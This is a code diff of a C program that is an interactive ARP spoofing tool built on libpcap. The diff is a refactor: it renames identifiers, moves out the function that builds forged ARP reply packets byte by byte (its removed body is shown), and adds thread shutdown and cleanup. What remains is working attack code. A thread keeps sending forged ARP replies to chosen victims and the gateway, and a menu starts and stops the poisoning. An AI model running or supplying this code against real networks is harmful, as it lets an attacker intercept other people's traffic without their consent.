@@ -1,3 +1,4 @@
+#include "std.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -6,59 +7,35 @@
 #include <pthread.h>
 #include <unistd.h>
 #include <linux/if_ether.h>
-#include "InitPcap.h"
+#include "PcapManager.h"
 #include "GetNetworkInfo.h"
 #include "AttackInfo.h"
 
-extern BYTE gLocalMAC[6];
-extern BYTE gGatewayIP[4];
-extern BYTE gGatewayMAC[6];
-extern BYTE gLocalIP[4];
+extern BYTE gLocalMac[MAC_LEN];
+extern BYTE gGatewayIp[IP_LEN];
+extern BYTE gGatewayMac[MAC_LEN];
+extern BYTE gLocalIp[IP_LEN];
 
-void MakeARPReplyPacket(BYTE* localMac, BYTE* victimMac, BYTE* arpSrcMAC, BYTE* gatewayIP, BYTE* victimIP, BYTE* arpReplyPacket)
-{
-    int i = 0;
-    int packetIdx = 0;
-
-    // set ethernet header
-    for (i = 0; i < 6; i++) arpReplyPacket[packetIdx++] = victimMac[i];
-    for (i = 0; i < 6; i++) arpReplyPacket[packetIdx++] = localMac[i];
-    arpReplyPacket[packetIdx++] = 0x08; // type : ARP
-    arpReplyPacket[packetIdx++] = 0x06;
-
-    // set ARP header
-    arpReplyPacket[packetIdx++] = 0x00; // Hardware Type : Ethernet
-    arpReplyPacket[packetIdx++] = 0x01;
-    arpReplyPacket[packetIdx++] = 0x08; // Protocol Type : IPv4
-    arpReplyPacket[packetIdx++] = 0x00;
-    arpReplyPacket[packetIdx++] = 0x06; // Hardware Size : 6
-    arpReplyPacket[packetIdx++] = 0x04; // Protocol Size : 4
-    arpReplyPacket[packetIdx++] = 0x00; // Opcode : Reply
-    arpReplyPacket[packetIdx++] = 0x02;
-    for (i = 0; i < 6; i++) arpReplyPacket[packetIdx++] = arpSrcMAC[i];
-    for (i = 0; i < 4; i++) arpReplyPacket[packetIdx++] = gatewayIP[i];
-    for (i = 0; i < 6; i++) arpReplyPacket[packetIdx++] = victimMac[i];
-    for (i = 0; i < 4; i++) arpReplyPacket[packetIdx++] = victimIP[i];
-}
+int gIsArpSendThreadTerminate;
 
 static void *ArpSenderThread(void *arg)
 {
     pcap_t** handle = arg;
-    BYTE arpReplyPacket[42];
+    BYTE packet[42];
     int i = 0;
 
-    while (1)
+    while (gIsArpSendThreadTerminate == 0)
     {
         for (i = 0; i < ATTACK_TABLE_MAX; i++)
         {
             if (gAttackInfoArr[i].set == 1)
             {
                 // arp response to sender
-                MakeARPReplyPacket(gLocalMAC, gAttackInfoArr[i].mac, gLocalMAC, gGatewayIP, gAttackInfoArr[i].ip, arpReplyPacket);
-                pcap_sendpacket(*handle, arpReplyPacket, 42);
+                MakeArpReplyPacket(gLocalMac, gAttackInfoArr[i].mac, gLocalMac, gGatewayIp, gAttackInfoArr[i].ip, packet);
+                pcap_sendpacket(*handle, packet, sizeof(packet));
                 // arp response to receiver
-                MakeARPReplyPacket(gLocalMAC, gGatewayMAC, gLocalMAC, gAttackInfoArr[i].ip, gGatewayIP, arpReplyPacket);
-                pcap_sendpacket(*handle, arpReplyPacket, 42);
+                MakeArpReplyPacket(gLocalMac, gGatewayMac, gLocalMac, gAttackInfoArr[i].ip, gGatewayIp, packet);
+                pcap_sendpacket(*handle, packet, sizeof(packet));
             }
         }
 
@@ -68,38 +45,37 @@ static void *ArpSenderThread(void *arg)
     return 0;
 }
 
-void EndARPSpoof(pcap_t* handle, int userIdx)
+void EndArpSpoof(pcap_t* handle, int userIdx)
 {
-    BYTE victimIP[4];
-    BYTE victimMAC[6];
-    BYTE arpReplyPacket[42];
+    BYTE victimIp[IP_LEN];
+    BYTE victimMac[MAC_LEN];
+    BYTE packet[42];
 
-    if (GetAttackInfo(userIdx, victimIP, victimMAC) == 0)
+    if (GetAttackInfo(userIdx, victimIp, victimMac) == 0)
     {
-        PrintMAC("restore ", victimMAC, "\n");
+        PrintMac("restore ", victimMac, "\n");
         DeleteAttackInfo(userIdx);
         sleep(2);
 
-        MakeARPReplyPacket(gLocalMAC, victimMAC, gGatewayMAC, gGatewayIP, victimIP, arpReplyPacket);
-        pcap_sendpacket(handle, arpReplyPacket, 42);
-        MakeARPReplyPacket(gLocalMAC, gGatewayMAC, victimMAC, victimIP, gGatewayIP, arpReplyPacket);
-        pcap_sendpacket(handle, arpReplyPacket, 42);
+        MakeArpReplyPacket(gLocalMac, victimMac, gGatewayMac, gGatewayIp, victimIp, packet);
+        pcap_sendpacket(handle, packet, sizeof(packet));
+        MakeArpReplyPacket(gLocalMac, gGatewayMac, victimMac, victimIp, gGatewayIp, packet);
+        pcap_sendpacket(handle, packet, sizeof(packet));
     }
 }
 
 int main(int argc, char** argv)
 {
     pcap_t* handle;
-    BYTE localMac[6] = {0,};
-    BYTE victimMac[6] = {0,};
-    BYTE victimIP[4];
+    BYTE victimIp[IP_LEN];
+    BYTE victimMac[MAC_LEN];
     char userInput[20];
 
     printf("[*] Get default network information\n");
 
-    if (GetLocalIPAddress(gLocalIP) == 0)
+    if (GetLocalIpAddress(gLocalIp) == 0)
     {
-        PrintIP("local IP address - ", gLocalIP, "\n");
+        PrintIp("local IP address - ", gLocalIp, "\n");
     }
     else
     {
@@ -107,9 +83,9 @@ int main(int argc, char** argv)
         exit(-1);
     }
 
-    if (GetLocalMacAddress(gLocalMAC))
+    if (GetLocalMacAddress(gLocalMac))
     {
-        PrintMAC("local MAC address - ", gLocalMAC, "\n");
+        PrintMac("local MAC address - ", gLocalMac, "\n");
     }
     else
     {
@@ -117,9 +93,9 @@ int main(int argc, char** argv)
         exit(-1);
     }
 
-    if (GetGatewayIP(gGatewayIP))
+    if (GetGatewayIp(gGatewayIp))
     {
-        PrintIP("gateway IP - ", gGatewayIP, "\n");
+        PrintIp("gateway IP - ", gGatewayIp, "\n");
     }
     else
     {
@@ -127,9 +103,9 @@ int main(int argc, char** argv)
         exit(-1);
     }
 
-    if (GetMacAddressFromByte(gGatewayIP, gGatewayMAC))
+    if (GetMacAddressFromByte(gGatewayIp, gGatewayMac))
     {
-        PrintMAC("gateway MAC - ", gGatewayMAC, "\n");
+        PrintMac("gateway MAC - ", gGatewayMac, "\n");
     }
     else
     {
@@ -151,7 +127,7 @@ int main(int argc, char** argv)
         }
         else
         {
-            // attr close;
+            pthread_attr_destroy(&attr);
             printf("arp sender thread execute fail\n");
             exit(-1);
         }
@@ -170,7 +146,7 @@ int main(int argc, char** argv)
                 fgets(userInput, 20, stdin);
                 userInput[strlen(userInput) - 1] = '\0';
 
-                if (!ConvertAddrToByteIP(userInput, victimIP))
+                if (!ConvertAddrToByteIp(userInput, victimIp))
                 {
                     printf("invalid IP\n");
                     continue;
@@ -178,7 +154,7 @@ int main(int argc, char** argv)
 
                 if (GetMacAddress(userInput, victimMac))
                 {
-                    PrintMAC("[*] victim MAC - ", victimMac, "\n");
+                    PrintMac("[*] victim MAC - ", victimMac, "\n");
                 }
                 else
                 {
@@ -186,7 +162,7 @@ int main(int argc, char** argv)
                     continue;
                 }
 
-                if (InsertAttackInfo(victimIP, victimMac))
+                if (InsertAttackInfo(victimIp, victimMac))
                 {
                     printf("ARP spoofing start to %s\n", userInput);
                 }
@@ -197,7 +173,7 @@ int main(int argc, char** argv)
                 printf("select number\n>>");
                 fgets(userInput, 20, stdin);
                 int num = atoi(userInput);
-                EndARPSpoof(handle, num);
+                EndArpSpoof(handle, num);
             }
             else if (userInput[0] == '3')
             {
@@ -205,11 +181,17 @@ int main(int argc, char** argv)
                 int i = 0;
                 for (; i < ATTACK_TABLE_MAX; i++)
                 {
-                    EndARPSpoof(handle, 1);
+                    EndArpSpoof(handle, 1);
                 }
                 break;
             }
         }
+
+        pcap_breakloop(handle);
+        pcap_close(handle);
+        gIsArpSendThreadTerminate = 1;
+        sleep(2);
+        pthread_attr_destroy(&attr);
     }
 
     return 0;
